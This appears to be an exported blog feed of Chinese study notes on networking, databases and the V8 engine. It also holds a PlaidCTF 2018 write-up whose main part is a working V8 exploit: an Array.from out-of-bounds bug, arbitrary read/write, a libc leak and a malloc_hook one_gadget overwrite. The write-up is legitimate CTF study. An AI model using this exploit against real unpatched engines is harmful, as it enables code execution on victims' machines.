核心部分网络核心部分最重要的功能就是交换,现在的交换技术有:电路交换,分组交换,报文交换等.互联网的核心部分采用了分组交换技术.路由器是实现分组交换的关键构件,其任务是存储并转发收到的分组. 电路交换电路交换:每一部电话都直接连接到交换机上,而交换机使用交换(转接,使电话线连通起来)的方法,让电话用户彼此之间可以很方便地通信. 电路交换必定是面向连接的,电路交换分为三个阶段. 建立连接:建立一条专用的物理通路,以保证双方通话时所需的通信资源在通信时不会被其他用户占用. 通信:主叫和被叫双方能互相通电话. 释放连接:释放刚才使用的这条专用的物理通路和占用的所有通信资源. 从通信资源的分配角度来看,交换就是按照某种方式动态地分配通信资源.电路交换的用户在通信过程中始终占用整条链路的通信资源,计算机数据具有突发性,所以不适合独占. 分组交换分组交换:采用存储转发技术,在发送端,先把较长的报文划分成较短的,固定长度的数据段,每一个数据段前面添加上首部(含有地址等控制信息)构成分组,依次把各分组发送出去;分组交换网以分组作为数据传输单元,收到分组的结点交换机根据收到的分组首部中的地址信息,把分组转发到下一个结点交换机,每个分组在互联网中独立地选择传输路径;接收端收到分组后剥去首部还原成报文. 主机为用户进行信息处理并向网络发送与接收分组.路由器对分组进行存储转发,最后把分组交付目的主机.在路由器(结点交换机)中的输入和输出端口之间没有直接连线,而是先把收到的分组放入缓存,查找转发表,找出到某个目的地址应从哪个端口转发,再把分组送到适当的端口转发出去. 分组交换的优点:传输过程中动态分配传输带宽,对通信链路逐段占用;分布式多路由的分组交换网,每个分组独立地选择最合适的转发路由;以分组作为传送单位;不需要建立连接; 分组交换的缺点:各结点存储转发时需要排队;分组首部造成了一定的内存开销. 报文交换报文交换:以报文为数据交换的单位,报文携带有目标地址,源地址等信息,在交换结点采用存储转发的传输方式. 报文交换的主要特点是:存储接受到的报文,判断其目标地址以选择路由,最后,在下一跳路由空闲时,将数据转发给下一跳路由.实际上分组交换就是改良后的报文交换.报文交换系统现今都由分组交换或电路交换网络所承载. 对比 若要连续传送大量的数据,且其传送时间远大于连接建立时间,则电路交换的传输速率较快. 报文交换和分组交换不需要预先分配传输带宽,在传送突发数据时可提高整个网络的信道利用率. 由于一个分组的长度往往远小于整个报文的长度,因此分组交换比报文交换的时延小,同时也具有更好的灵活性. 多种计算机网络按照网络的作用范围进行分类. 广域网WAN(Wide Area Network):作用范围通常为几十到几千公里. 城域网MAN(Metropolitan Area Network):作用距离约为5 ~ 50公里. 局域网LAN(Local Area Network):局限在较小的范围(如1公里左右). 个人区域网PAN(Personal Area Network):范围很小,大约在10米左右. 身域网:范围更小,只能覆盖到部分身体. 若中央处理机之间的距离非常近(如仅1米的数量级甚至更小些),则一般就称之为多处理机系统,而不称它为计算机网络. 按照网络的使用者进行分类. 公用网(public network):按规定交纳费用的人都可以使用的网络,因此也可称为公众网. 专用网(private network):为特殊业务工作的需要而建造的网络. 用来把用户接入到互联网的网络称为接入网AN(Access Network),它又称为本地接入网或居民接入网,接入网是一类比较特殊的计算机网络. 接入网本身既不属于互联网的核心部分,也不属于互联网的边缘部分.接入网是从某个用户端系统到互联网中的第一个路由器(也称为边缘路由器)之间的一种网络.从覆盖的范围看,很多接入网还是属于局域网.从作用上看,接入网只是起到让用户能够与互联网连接的桥梁作用. 按照网络的拓扑结构划分:总线型结构.环形结构.星形结构.树形结构.网状结构.混合型结构. 计算机网络的性能指标计算机网络的性能一般是指:速率,带宽,吞吐率,时延,时延带宽积,往返时间RTT,利用率. 一些非性能特征也很重要:费用,质量,标准化,可靠性,可扩展性和可升级性,可管理性和可维护性. 速率速率指的是数据的传送速率,也称为数据率或比特率.速率的标准单位是bit/s.速率往往是指额定速率或标称速率,非实际运行速率. 带宽带宽本来是指信号具有的频带宽度,其标准单位是赫.在计算机网络中,带宽用来表示网络中某信道传送数据的能力,表示在单位时间内网络中的某信道所能通过的最高数据率. 在带宽的上述两种表述中,前者为频域称谓,而后者为时域称谓,其本质是相同的.一条通信链路的带宽越宽,其所能传输的最高数据率也越高.在时间轴上信号的宽度随带宽的增大而变窄. 吞吐量吞吐量表示在单位时间内通过某个网络(信道,接口)的数据量,用于衡量网络在单位时间内无差错地传输数据的能力.吞吐量受网络的带宽或网络的额定速率的限制. 时延时延是指数据从网络(或链路)的一端传送到另一端所需的时间,有时也称为延迟或迟延. 网络中的时延由几个不同的部分组成:发送时延,传播时延,处理时延,排队时延.在总时延中,究竟是哪一种时延占主导地位,必须具体分析. 发送时延(传输时延):从发送数据帧的第一个比特算起,到该帧的最后一个比特发送完毕所需的时间.其值为数据帧长度除以发送速率. 传播时延:电磁波在信道中需要传播一定的距离而花费的时间.其值为信道长度除以信号在信道上的传播速率. 处理时延:主机或路由器在收到分组时,为处理分组所花费的时间.在该过程由于队列已满会导致丢包重发与网络阻塞. 排队时延:分组在路由器输入输出队列中排队等待处理.排队时延的长短往往取决于网络中当时的通信量. 高速网络链路提高的仅仅是数据的发送速率而不是比特在链路上的传播速率,即减小了数据的发送时延.宽带链路和窄带链路上比特的传播速率是一样的. 时延的计算分组交换的时延:源发送时延(主机,发送的是整个报文,包括首部),传播时延,中间发送时延(路由器,发送的是单个分组),中间结点的处理时延和排队时延,接收主机的处理时延. 电路交换的时延:源发送时延(主机,发送的是整个报文),传播时延,建立连接时延,接收主机的处理时延. 时延带宽积时延带宽积又称为以比特为单位的链路长度,其值为传播时延乘带宽.只有在代表链路的管道都充满比特时,链路才得到了充分利用. 往返时间往返时间:从发送方发送数据开始,到发送方收到来自接收方的确认,总共经历的时间.当使用卫星通信时,往返时间RTT相对较长,是很重要的一个性能指标. 利用率信道利用率:某信道有百分之几的时间是被利用的(有数据通过).完全空闲的信道的利用率是零.网络利用率是全网络的信道利用率的加权平均值. 根据排队论的理论,当某信道的利用率增大时,该信道引起的(排队)时延也就迅速增加.若令D0表示网络空闲时的时延,D表示网络当前的时延,U是网络的利用率,则在适当的假定条件下,D和D0之间的关系:D = D0 / (1 - U). 计算机网络的体系结构计算机网络的体系结构:计算机网络的各层及其协议的集合,就是计算机网络及其部件所应完成的功能的精确定义.实现:遵循体系结构的前提下用何种硬件或软件完成这些功能的问题.体系结构是抽象的,而实现则是具体的,是真正在运行的计算机硬件和软件. ISO提出了一个试图使各种计算机在世界范围内互连成网的标准框架,即著名的开放系统互连基本参考模型OSI/RM,简称为OSI.遵循OSI标准的系统可以和遵循这一标准的其他任何系统进行通信.OSI并没有得到市场的认可,非国际标准TCP/IP获得了最广泛的应用.TCP/IP常被称为事实上的国际标准. 计算机网络需要完成的主要功能. 差错控制:使相应层次对等方的通信更加可靠. 流量控制:发送端的发送速率必须使接收端来得及接收,不要太快. 分段和重装:发送端将要发送的数据块划分为更小的单位,在接收端将其还原. 复用和分用:发送端几个高层会话复用一条低层的连接,在接收端再进行分用. 连接建立和释放:交换数据前先建立一条逻辑连接,数据传送结束后释放连接. 协议与划分层次网络体系结构解决异质性问题采用的是层次结构方法,将复杂的网络互联问题划分为若干个较小的,单一的问题,在不同层上予以解决.层次结构方法包括三个内容:分层及每层功能,服务与层间接口,还有对应的协议. 通信虚电路:通信是在同层之间进行,第N层只能与对方的第N层通信. 通信实电路:每一层将数据和控制信息传送给下一层,直至最底层,通过物理介质进行实际的传输. 多层通信的实质:对等层实体之间虚拟通信,下层向上层提供服务,实际通信在最底层完成.协议是横向的,而服务是纵向的. 分层好处:各层之间是独立的;灵活性好;结构上可分割开;易于实现和维护;能促进标准化工作.分层缺点:降低效率;有些功能会在不同的层次中重复出现,因而产生了额外开销. 计算机网络中的数据交换必须遵守事先约定好的规则(网络协议),这些规则明确规定了所交换的数据的格式以及有关的同步问题(时序). 网络协议的三要素. 语法:数据与控制信息的结构或格式. 语义:需要发出何种控制信息,完成何种动作以及做出何种响应. 同步(或时序):事件实现顺序的详细说明. 协议的两种形式:一种是使用便于人来阅读和理解的文字描述;另一种是使用让计算机能够理解的程序代码. OSI七层协议OSI物理层规定了介质与插接件的规格,信号的制式,收发与转发设备的性能,插接件各针的功能定义以及建立连接,传送位流和拆除连接的操作规程.规定了在物理媒体上传输的数据单位,比特流;规定了传输媒体之间的机械,电气,功能和规程的特性.为数据链路层提供服务. OSI数据链路层依靠组建数据帧,实现帧同步,按帧进行检错,重发出错帧,根据需要进行流量和顺序控制等来保证相邻结点之间有可靠的数据传输,从而达到无差错地传输帧.传输的数据单位,帧.提供面向连接的链路管理.为网络层提供服务. 数据帧在数据链路上传输的几种情况. OSI网络层处理如何将分组从源传送到目的地.数据传输单位,分组.提供路由选择算法.提供流量控制.通过子网划分防止广播.控制网络互连. 虚电路和数据报是面向连接和无连接服务在网络层的具体实现. 虚电路服务:在传送数据之前,首先通过虚呼叫建立一条虚电路;所有分组沿同一条路径传送,并且按发出顺序到达,类似电路交换;建立连接后,分组中只需携带连接标识;建立连接时可协商参数,开销等. 数据报服务:每个分组单独传送;网络为每个分组单独选路,路径可能不同;分组到达顺序可能与发出顺序不同;分组中需要携带完整的目的地址. 以上三层被称为通信子网,即用于信号的传输.以下四层被称为资源子网,即用于主机对信号的处理. OSI传输层一方面弥补网络层的不足,另一方面对高层屏蔽子网的不一致性;传输层的目的是提供有效,可靠且价格合理的端对端的通信服务,从端到端(主机到主机)经网络透明地传输报文,但不知道通信子网.传输的数据单位,报文.提供面向连接的服务和无连接的服务.提供流量控制和差错控制. OSI会话层负责不同主机的不同进程间的通信.提供会话同步,为通信的应用进程建立与组织会话,使应用进程能管理与控制通信进程. OSI表示层为通信双方的应用层实体提供共同的表达手段,使双方能正确地理解所传送的信息.实际上表示层的功能涉及到格式转换,数据加密与数据压缩等诸多方面数据格式的转换. OSI应用层规定应用应该遵循的规则,也是最终用户的接口. OSI七层协议小结:应用层相当于做什么.表示层相当于看起来像什么.会话层相当于轮到谁讲话,从何处讲.传输层相当于对方在何处.网络层相当于走那条路可到达对方.数据链路层相当于每一步该怎么走.物理层就是在物理媒体上透明地传输比特流. 数据传输模型OSI参考模型把对等层次之间传送的数据单位称为该层的协议数据单元PDU,现已被许多非OSI标准采用.物理层PDU指数据位.数据链路层PDU指数据帧.网络层PDU指数据包.传输层PDU指数据段.会话层或以上为数据.在特定的上下文情况下,特定层的PDU有时可以代表这个层. 任何两个同样的层次把数据(即数据单元加上控制信息)通过水平虚线直接传递给对方,这就是所谓的对等层之间的通信. 主机1向主机2发送数据. TCP/IP参考模型 数据链路层:采用现成的局域网协议.802.3以太网协议,802.4令牌网协议,802.5令牌环协议,PPP点到点协议. 网络层:四个协议.IP,ICMP,ARP,RARP. 传输层:TCP,可靠,面向连接,有序,字节流;UDP,不一定可靠,无连接,无序,数据报. 应用层:SMTP,DNS,FTP,HTTP,telnet. TCP/IP模型缺点:概念模糊,不通用,不适合描述其他任何协议栈,主机至网络层不是常规意义上层的概念,而是接口,没有区分物理层和数据链路层. TCP/IP与OSI的对比.相似处:都采用分层结构,基于一组相关的协议,功能上基本相当;都有提供可靠的端到端传输服务的传输层,并作为面向应用功能和面向传输功能的分界线. 不同处:OSI中,服务,协议,接口三者独立,与现代的面向对象方法非常吻合,协议改动不会互相影响.服务告诉上层能做什么,接口告诉上层怎样访问服务,协议解决对等层交互.TCP/IP没有清晰的服务定义,协议间引用直接通过报文,协议不具有透明性. OSI/RM的制定先于协议.好处,更为通用;问题,非最优化,直接影响是效率低.TCP/IP先有协议,后有参考模型.优化,效率高,但影响通用性. 实体,协议,服务和服务访问点实体表示任何可发送或接收信息的硬件或软件进程.协议是控制两个对等实体进行通信的规则的集合.在协议的控制下,两个对等实体间的通信使得本层能够向上一层提供服务.要实现本层协议,还需要使用下层所提供的服务.协议的实现保证了能够向上一层提供服务.本层的服务用户只能看见服务而无法看见下面的协议,即下面的协议对上面的服务用户是透明的. 协议是水平的,即协议是控制对等实体之间通信的规则.服务是垂直的,即服务是由下层向上层通过层间接口提供的.上层使用服务原语获得下层所提供的服务. 同一系统相邻两层的实体进行交互的地方,称为服务访问点SAP.SAP实际上就是一个逻辑接口.OSI把层与层之间交换的数据的单位称为服务数据单元SDU.SDU可以与PDU不一样.例如:可以是多个SDU合成为一个PDU,也可以是一个SDU划分为几个PDU. TCP/IP的体系结构 实际上,现在的互联网使用的TCP/IP体系结构有时已经发生了演变,即某些应用程序可以直接使用IP层,或甚至直接使用最下面的网络接口层.]]></content>
      <categories>
        <category>CS</category>
        <category>computer-network</category>
      </categories>
      <tags>
        <tag>computer-network</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-database-principles-基础]]></title>
    <url>%2Fposts%2F3c74da6b%2F</url>
    <content type="text"><![CDATA[基本概念数据是数据库中存储的基本对象,是描述事物的符号记录.所有信息都是数据,不论复杂还是简单,例如:文本,图形,图像,音频,视频等.数据与其语义(含义)是不可分的.93是一个数据,它可以是某人的成绩,体重或者一个学校的人数等等. 数据库是长期储存在计算机内,有组织的,可共享的大量数据的集合.在数据库中数据按一定的数据模型组织,描述和储存;为各种用户共享;由DBMS统一管理和控制;整体数据的结构化;数据独立性较高且易扩展. 数据库管理系统(DBMS)是位于用户与操作系统之间的一层数据管理软件,用于科学地组织和存储数据,高效地获取和维护数据. 数据库管理系统功能. 数据定义功能(提供数据定义语言定义数据库中的数据对象). 数据组织,存储和管理功能.分类组织,存储和管理各种数据;确定组织数据的文件结构和存取方式;实现数据之间的联系;提供多种存取方法提高存取效率 数据操纵功能(提供数据操纵语言实现对数据库的基本操作,CURD). 数据库的事务管理和运行管理,数据库在建立,运行和维护时由DBMS统一管理和控制,保证数据的安全性,完整性,多用户对数据的并发使用和发生故障后的系统恢复. 数据库的建立和维护功能(数据库初始数据装载转换,数据库转储,介质故障恢复,数据库的重组织,性能监视分析等). DBMS与网络中其它软件系统的通信,两个DBMS系统的数据转换,异构数据库之间的互访和互操作. 数据库系统是在计算机系统中引入数据库后的系统构成,其包括:数据库,操作系统,数据库管理系统及其开发工具,应用系统,数据库管理员,用户. 数据管理技术数据管理技术是对数据进行分类,组织,编码,存储,检索和维护.是数据处理的中心问题.发展过程:人工管理阶段,文件系统阶段,数据库系统阶段. 数据库系统的特点:数据结构化,数据的共享性高,冗余度低,易扩充,数据独立性高,数据由DBMS统一管理和控制. 整体数据的结构化是数据库的主要特征之一,不仅数据内部结构化,整体也是结构化的,数据之间具有联系.数据的结构用数据模型描述,无需程序定义和解释,数据可以变长,数据的最小存取单位是数据项. 数据库系统从整体角度看待和描述数据,数据面向整个系统,可以被多个用户,多个应用共享使用. 数据库系统中的数据独立性体现在两个方面:物理独立性,指用户的应用程序与存储在磁盘上的数据库中数据是相互独立的;逻辑独立性,指用户的应用程序与数据库的逻辑结构是相互独立的.数据独立性是由DBMS的二级映像功能来保证的. 数据由DBMS统一管理和控制,DBMS提供的数据控制功能:数据的安全性保护,数据的完整性检查,并发控制,数据库恢复. 数据模型两大类数据模型数据库中用数据模型这个工具来抽象,表示和处理现实世界中的数据和信息. 数据模型分为两类:概念模型,也称信息模型,是按用户的观点来对数据和信息建模,用于数据库设计;逻辑模型和物理模型,逻辑模型主要包括网状模型,层次模型,关系模型,面向对象模型等,按计算机系统的观点对数据建模,用于DBMS实现.物理模型是对数据最底层的抽象,描述数据在系统内部的表示方式和存取方法,和磁盘或磁带上的存储方式和存取方法. 客观对象的抽象过程,两步抽象,现实世界中的客观对象抽象为概念模型,把概念模型转换为某一DBMS支持的数据模型/逻辑模型.逻辑模型到物理模型由DBMS完成. 数据模型的组成要素数据模型的组成要素:数据结构,数据操作,完整性约束条件. 数据结构是描述数据库的组成对象,以及对象之间的联系.包括与数据类型,内容,性质有关的对象,与数据之间联系有关的对象.数据结构是对系统静态特性的描述. 数据操作是对数据库中各种对象(型)的实例(值)允许执行的操作及有关的操作规则.操作包括查询,更新(包括插入,删除,修改),即CURD.数据模型对操作的定义包括:操作的确切含义,操作符号,操作规则,实现操作的语言.数据操作是对系统动态特性的描述. 数据的完整性约束条件是一组完整性规则的集合,完整性规则是给定的数据模型中数据及其联系所具有的制约和储存规则,用以限定符合数据模型的数据库状态以及状态的变化,以保证数据的正确,有效,相容. 数据模型对完整性约束条件的定义:反映和规定本数据模型必须遵守的基本的通用的完整性约束条件.例如在关系模型中,任何关系必须满足实体完整性和参照完整性两个条件.提供定义完整性约束条件的机制,以反映具体应用所涉及的数据必须遵守的特定的语义约束条件. 概念模型概念模型用于信息世界的建模,是现实世界到机器世界的一个中间层次,数据库设计人员和用户之间进行交流的语言.对概念模型的基本要求:较强的语义表达能力,能够方便,直接地表达应用中的各种语义知识,简单,清晰,易于用户理解. 信息世界中的基本概念 实体Entity:客观存在并可相互区别的事物称为实体,可以是具体的人,事,物或抽象的概念. 属性Attribute:实体所具有的某一特性称为属性,一个实体可以由若干个属性来刻画. 码Key:唯一标识实体的属性集称为码. 域Domain:属性的取值范围称为该属性的域. 实体型Entity Type:用实体名及其属性名集合来抽象和刻画同类实体称为实体型. 实体集Entity Set:同一类型实体的集合称为实体集. 联系Relationship:现实世界中事物内部以及事物之间的联系在信息世界中反映为实体内部的联系和实体之间的联系.实体内部的联系通常是指组成实体的各属性之间的联系,实体之间的联系通常是指不同实体集之间的联系. 实体型之间的联系实体型之间的三类联系. 两个实体型之间一对多联系:如果对于实体集A中的每一个实体,实体集B中有n个实体(n &gt;= 0)与之联系;对于实体集B中的每一个实体,实体集A中至多只有一个实体与之联系,则称实体集A与实体集B有一对多联系,记为1:n.例如班级与学生. 两个实体型之间多对多联系:如果对于实体集A中的每一个实体,实体集B中有n个实体(n &gt;= 0)与之联系;对于实体集B中的每一个实体,实体集A中有m个实体(m &gt;= 0)与之联系,则称实体集A与实体集B有多对多联系,记为m:n.例如课程与学生. 概念模型的一种表示方法实体-联系方法(E-R方法/E-R模型):用E-R图来描述现实世界的概念模型.]]></content>
      <categories>
        <category>CS</category>
        <category>database-principles</category>
      </categories>
      <tags>
        <tag>database-principles</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-plaidctf-2018-roll-a-d8]]></title>
    <url>%2Fposts%2F76027108%2F</url>
    <content type="text"><![CDATA[准备找到包含漏洞的版本的hash值和poc文件,通过parent的hash值回退到漏洞版本,并编译debug模式. 1234git reset --hard 1dab065bb4025bdd663ba12e2e976c34c3fa6599gclient synctools/dev/v8gen.py x64.debug ninja -C out.gn/x64.debug d8 漏洞分析Patch分析 将GenerateSetLength中一次跳转中的SmiLessThan修改为SmiNotEqual,说明应该是在length_smi &gt; old_length时的处理出现了问题. POC分析1234567891011121314151617let oobArray = [];let maxSize = 1028 * 8;Array.from.call(function() &#123; return oobArray &#125;, &#123; [Symbol.iterator] : _ =&gt; ( &#123; counter : 0, next() &#123; let result = this.counter++; if (this.counter &gt; maxSize) &#123; oobArray.length = 0; return &#123;done: true&#125;; &#125; else &#123; return &#123;value: result, done: false&#125;; &#125; &#125; &#125; ) &#125;);oobArray[oobArray.length - 1] = 0x41414141; 首先创建了一个数组oobArray. 然后将function() { return oobArray }作为this参数传入Array.from.call. 12345678910111213141516171819202122232425262728293031define(Array, 'from', function from(items) &#123; var mapfn = arguments[1]; var thisArg = arguments[2]; var c = strict(this); //code var usingIterator = GetMethod(items, $$iterator); if (usingIterator !== undefined) &#123; if (IsConstructor(c)) &#123; var a = new c(); &#125; else &#123; a = new Array(0); &#125; var iterator = GetIterator(items, usingIterator); var k = 0; while (true) &#123; var next = IteratorStep(iterator); if (next === false) &#123; a.length = k; return a; &#125; var nextValue = IteratorValue(next); if (mapping) var mappedValue = mapfn.call(t, nextValue); else mappedValue = nextValue; a[k] = mappedValue; k += 1; &#125; &#125;//code 查看polyfill实现可知:Array.from.call的this参数是一个函数,所以会调用var a = new c(). 当使用new关键字调用一个函数时,若函数返回一个非原始变量(如object,array或function),那么这些返回值将取代原本应该返回的this实例. 所以此时a = oobArray,此后的操作都将直接修改oobArray. 最后的赋值语句触发crash,可能是最后一次迭代时对oobArray.length的赋值时出现了bug,导致最后oobArray实际长度与length的值的不同,造成越界访问. 漏洞解析123456789101112131415161718192021222324void GenerateSetLength(TNode&lt;Context&gt; context, TNode&lt;Object&gt; array, TNode&lt;Number&gt; length) &#123; Label fast(this), runtime(this), done(this); BranchIfFastJSArray(array, context, &amp;fast, &amp;runtime); BIND(&amp;fast); &#123; TNode&lt;JSArray&gt; fast_array = CAST(array); TNode&lt;Smi&gt; length_smi = CAST(length); TNode&lt;Smi&gt; old_length = LoadFastJSArrayLength(fast_array); CSA_ASSERT(this, TaggedIsPositiveSmi(old_length)); EnsureArrayLengthWritable(LoadMap(fast_array), &amp;runtime); GotoIf(SmiLessThan(length_smi, old_length), &amp;runtime); StoreObjectFieldNoWriteBarrier(fast_array, JSArray::kLengthOffset, length_smi); Goto(&amp;done); &#125; BIND(&amp;runtime); &#123; CallRuntime(Runtime::kSetProperty, context, static_cast&lt;Node*&gt;(array), CodeStubAssembler::LengthStringConstant(), length, SmiConstant(LanguageMode::kStrict)); Goto(&amp;done); &#125; BIND(&amp;done);&#125; 漏洞出发点应该在GenerateSetLength中length_smi &gt; old_length时,会直接调用StoreObjectFieldNoWriteBarrier(fast_array, JSArray::kLengthOffset, length_smi);然后结束处理. 应该是这里将较大的length_smi写入,导致数组的长度属性值大于实际长度. 跟踪发现该函数的调用者如下. 12345678910// ES #sec-array.fromTF_BUILTIN(ArrayFrom, ArrayPopulatorAssembler) &#123; //code BIND(&amp;finished); //调用GenerateSetLength,将array和迭代次数作为参数 GenerateSetLength(context, array.value(), length.value()); args.PopAndReturn(array.value());&#125; 分析可知函数会使用ConstructArrayLike返回一个数组array,用于存储迭代输出的结果.配合前文分析的polyfill中的实现,这里返回的数组就是oobArray(可以通过%DebugPrint()和Print()对比进行验证). 然后会使用Symbol.iterator进行迭代,每次迭代所得到的值存入array,迭代结束后将进入将index赋值给了length,也就是说length中存储的是迭代次数. 最后将context,array和迭代次数作为参数调用GenerateSetLength. 这里存在一个竞争漏洞,若数组是初始数组,那么就可以在迭代途中修改数组的长度,将正在迭代的数组长度缩小导致数组多余的空间被释放,但是在GenerateSetLength中,又将array.length直接改写为较大的length_smi,导致长度属性值大于实际长度,从而越界访问. exp编译release模式. 12tools/dev/v8gen.py x64.releaseninja -C out.gn/x64.release d8 12gdb ./out.gn/x64.release/d8pwndbg&gt; r --allow-natives-syntax ../poc.js 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153var f64 = new Float64Array(1);var u32 = new Uint32Array(f64.buffer);function d2u(v) &#123; f64[0] = v; return u32;&#125;function u2d(lo, hi) &#123; u32[0] = lo; u32[1] = hi; return f64[0];&#125;var bufs = [];var objs = [];var oobArray = [1.1];var maxSize = 1028 * 8;Array.from.call(function() &#123; return oobArray; &#125;, &#123; [Symbol.iterator] : _ =&gt; (&#123; counter : 0, next() &#123; let result = 1.1; this.counter++; if (this.counter &gt; maxSize) &#123; oobArray.length = 1; for (let i = 0;i &lt; 100;i++) &#123; bufs.push(new ArrayBuffer(0x1234)); let obj = &#123;'a': 0x4321, 'b': 0x9999&#125;; objs.push(obj); &#125; return &#123;done: true&#125;; &#125; else &#123; return &#123;value: result, done: false&#125;; &#125; &#125;&#125;)&#125;);//标记可控的buflet buf_offset = 0;for(let i = 0; i &lt; maxSize; i++)&#123; let val = d2u(oobArray[i]); if(val === 0x123400000000)&#123; console.log("buf_offset: " + i.toString()); buf_offset = i; oobArray[i] = u2d(0x121200000000); oobArray[i + 3] = u2d(0x1212); break; &#125;&#125;//标记可控的objlet obj_offset = 0for(let i = 0; i &lt; maxSize; i++)&#123; let val = d2u(oobArray[i]); if(val === 0x432100000000)&#123; console.log("obj_offset: " + i.toString()); obj_offset = i; oobArray[i] = u2d(0x567800000000); break; &#125;&#125;//找到可控的buflet controllable_buf_idx = 0;for(let i = 0; i &lt; bufs.length; i++)&#123; let val = bufs[i].byteLength; if(val === 0x1212)&#123; console.log("controllable_buf_idx: " + i.toString()); controllable_buf_idx = i; break; &#125;&#125;//找到可控的objlet controllable_obj_idx = 0;for(let i = 0; i &lt; objs.length; i++)&#123; let val = objs[i].a; if(val === 0x5678)&#123; console.log("controllable_obj_idx: " + i.toString()); controllable_obj_idx = i; break; &#125;&#125;//%DebugPrint(bufs[controllable_buf_idx]);//%DebugPrint(objs[controllable_obj_idx]);//readline();var heap_addr = d2u(oobArray[buf_offset + 1]) - 0x10console.log("heap_addr: 0x" + heap_addr.toString(16));class arbitraryRW&#123; constructor(buf_offset, buf_idx, obj_offset, obj_idx)&#123; this.buf_offset = buf_offset; this.buf_idx = buf_idx; this.obj_offset = obj_offset; this.obj_idx = obj_idx; &#125; leak_obj(obj)&#123; objs[this.obj_idx].a = obj; return d2u(oobArray[this.obj_offset]) - 1; &#125; read(addr)&#123; let idx = this.buf_offset; oobArray[idx + 1] = u2d(addr); oobArray[idx + 2] = u2d(addr); let tmp = new Float64Array(bufs[this.buf_idx], 0, 0x10); return d2u(tmp[0]); &#125; write(addr, val)&#123; let idx = this.buf_offset; oobArray[idx + 1] = u2d(addr); oobArray[idx + 2] = u2d(addr); let tmp = new Float64Array(bufs[this.buf_idx], 0, 0x10); tmp.set([u2d(val)]); &#125;&#125;var arw = new arbitraryRW(buf_offset, controllable_buf_idx, obj_offset, controllable_obj_idx);//搜索堆内存泄露libc基址let curr_chunk = heap_addr;let searched = 0;for(let i = 0; i &lt; 0x5000; i++)&#123; let size = arw.read(curr_chunk + 0x8); let prev_size = arw.read(curr_chunk); if(size !== 0 &amp;&amp; size % 2 === 0 &amp;&amp; prev_size &lt;= 0x3f0)&#123; let tmp_ptr = curr_chunk - prev_size; let fd = arw.read(tmp_ptr + 0x10); let bk = arw.read(tmp_ptr + 0x18) if(parseInt(fd / 0x10000000000) === 0x7f)&#123; searched = fd; break; &#125;else if(parseInt(bk / 0x10000000000) === 0x7f)&#123; searched = bk; break; &#125; &#125; else if(size &lt; 0x20) &#123; break; &#125; size = parseInt(size / 8) * 8 curr_chunk += size;&#125;if(searched !== 0)&#123; var libc_base = parseInt((searched - 0x3eb000) / 0x1000) * 0x1000; console.log("searched libc_base: 0x" + libc_base.toString(16)); //修改malloc_hook实现getshell malloc_hook = 0x3ebc30 + libc_base; one_gadet = 0x4f322 + libc_base; arw.write(malloc_hook, one_gadet);&#125; else &#123; console.log("Not found"); readline();&#125;]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[binary-源码分析-v8-概览]]></title>
    <url>%2Fposts%2F5d95ee2e%2F</url>
    <content type="text"><![CDATA[概览v8是Google的JavaScript与WebAssembly引擎,使用C++编写,被用于Chrome和Node.js等应用程序中,同时也可以独立运行. 早期的v8引擎首先解析源代码构造AST(抽象语法树),JIT编译器(实时编译器)再基于AST将其编译成机器代码执行,运行过程中有选择的进行优化. 而现在AST首先被转化为bytecode执行,再有选择的将字节码与分析数据一起发给优化编译器TurboFan.如果在某点上一个假设被证明是不正确的,那么优化编译器会去优化并回退至解释器部分. v8引擎使用了多线程处理. 主线程获取源代码并对其进行编译后执行(v8的机器代码处于RWX段). 有单独的线程进行代码优化,再次将源代码编译为机器语言,并将正在运行的机器语言替换掉. 有单独的线程分析程序运行状态,对优化机制和优化编译器提供信息. 有单独的线程来进行垃圾回收机制. 编译器更迭. 2008年,v8使用Full-Codegen(JIT编译器,作为基准编译器,对应源码v8/src/full-codegen/)直接生成和执行机器代码. 2010年,v8引入用于优化hot-code的Crankshaft(优化编译器,对应源码v8/src/crankshaft/). 2015年,v8引入用于优化hot-code的TurboFan(优化编译器,对应源码v8/src/compiler/pipeline.cc),更好的适应新JS规范. 2017年,v8引入用于生成中间语言(利用AST生成bytecode,具体由v8::internal::AstVisitor类完成)再生成机器代码的Ignition(对应源码v8/src/interpreter/). 2018年,v8移除Full-Codegen和Crankshaft. 一些重要的源文件. api.cc,api.h:定义v8的API. compiler.cc:编译的起点,被api.cc调用. globals.h:常量和其他的定义. heap/:该目录为垃圾回收机制的源码. ic/:该目录为Inline Caching的源码. objects-ini.h,objects.h,objects.cc,type.h,type.cc:包含了v8中使用的对象和类型的定义. 延迟解析如果解析的代码没有被执行,这会造成性能浪费,所以v8采用延迟解析,将解析分为两个阶段. 首先预解析所有函数的布局,进行初步的语法错误检查并获取函数的范围. 在运行过程真正调用函数时才进行解析. v8还实现了自己的解析器(而不是编译器编译器,比如:yacc,lex),并使用递归下降语法分析进行解析. 编译器v8到现在共有过四个编译器:Full-Codegen,Crankshaft,TurboFan,Ignition. Full-CodegenFull-Codegen直接将AST转换为汇编语言,通过它,v8把要执行的JavaScript代码转换为机器语言(尚未优化)并输出到JIT区域(RWX区域),将EIP寄存器移到这个JIT区域并按原样继续执行. Ignitionv8通过v8::internal::AstVisitor(使用Vistor模式)这个基类从AST生成bytecode. 生成的bytecode存储在BytecodeArray中,最终生成的字节码是从被称为InterpreterEntryTrampoline的Builtin代码执行的,InterpreterEntryTrampoline被编译成Assembly,并且被当成普通的C函数调用. Ignition是一种基于寄存器的bytecode解释器,将值分配给CPU的寄存器,并执行它们.Ignition通过预先生成一个名为BytecodeHandler的字节码处理函数,该函数从bytecode中获得一个索引,调用对应的汇编代码,从而执行bytecode数组. 优化编译器Crankshaft和TurboFan都属于优化编译器,会在运行过程中对hot-code进行优化. hot-code指被多次调用的函数/循环,被判断为hot-code的代码会在其他线程里被turbofan/crankshar再次编译,通过替换jmp目标地址(在主线程中执行)来执行优化过的代码. 2015 ~ 2017期间有两种优化编译器,根据以下规则运行. 函数/循环中使用debugger语句和eval语句不调用优化编译器. 函数/循环中有use asm语句或者Crankshaft不支持的语法,使用TurboFan. 其他时候Crankshaft被默认使用. 